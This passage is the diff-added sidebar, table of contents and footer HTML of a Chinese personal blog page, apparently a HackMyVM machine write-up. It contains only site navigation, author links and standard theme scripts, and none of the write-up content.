+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">端口扫描&#x2F;信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="nav-text">web探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayukakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayukakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/48411.html" title="posts&#x2F;48411.html">HMV-Five</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/38113.html" title="posts&#x2F;38113.html">SWPUCTF_2022新生赛(web)WP</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50600.html" title="posts&#x2F;50600.html">HMV-insomnia</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62818.html" title="posts&#x2F;62818.html">寒假总结</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/25446.html" title="posts&#x2F;25446.html">SWPUCTF_2021新生赛(web)WP</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
